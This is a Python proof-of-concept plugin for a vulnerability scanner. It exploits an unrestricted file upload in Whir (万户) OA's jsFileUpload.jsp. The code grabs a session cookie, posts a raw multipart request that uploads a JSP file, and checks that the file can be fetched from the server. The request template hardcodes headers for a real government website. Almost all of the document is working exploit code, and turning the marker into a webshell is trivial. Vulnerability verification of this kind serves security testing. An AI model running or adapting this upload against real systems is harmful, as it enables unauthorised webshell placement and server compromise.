# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Whir_0005'  # 平台漏洞编号，留空
    name = '万户OA系统 文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-08-28'  # 漏洞公布时间
    desc = '''
        万户软件是一个坚持网络风格是最大限度提升软件健壮性的一种有效手段，因为这样一来，决定应用并发数的并不是软件平台本身，而是硬件和网络速度；也就是说，从理论上讲，类似万户协同ezOFFICE这样的软件平台没有严格的并发数限制。
        万户OA系统 /defaultroot/work_flow/jsFileUpload.jsp页面未做限制，可上传任意文件。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/41373.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'da2d5670-ec2d-4c4c-8650-429cdc894ac4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload = '/defaultroot/work_flow/jsFileUpload.jsp?flag=1'
            url = self.target + payload
            code, head, body, errcode, fina_url = hh.http(self.target)
            m = re.findall(r'(JSESSIONID=[^;]+);', head)
            if m:
                raw = '''
POST /defaultroot/work_flow/jsFileUpload.jsp?flag=1 HTTP/1.1
Host: www.gxdot.gov.cn
Content-Length: 306
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://www.gxdot.gov.cn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGdAZ2plNzduNYMp
Referer: http://www.gxdot.gov.cn/defaultroot/work_flow/jsFileUpload.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: %s

------WebKitFormBoundarydGdAZ2plNzduNYMp
Content-Disposition: form-data; name="photo"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_test
------WebKitFormBoundarydGdAZ2plNzduNYMp
Content-Disposition: form-data; name="submit"

sub
------WebKitFormBoundarydGdAZ2plNzduNYMp--''' % m[0]
                shell = self.target + '/defaultroot/devform/workflow/testvul.jsp'
                code1, head1, body1, errcode, fina_url = hh.http(url, raw=raw)
                if code1 == 200:
                    code2, head2, body2, errcode, fina_url = hh.http(shell)
                    if code2 == 200 and 'testvul_test' in body2:
                        # security_hole(url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
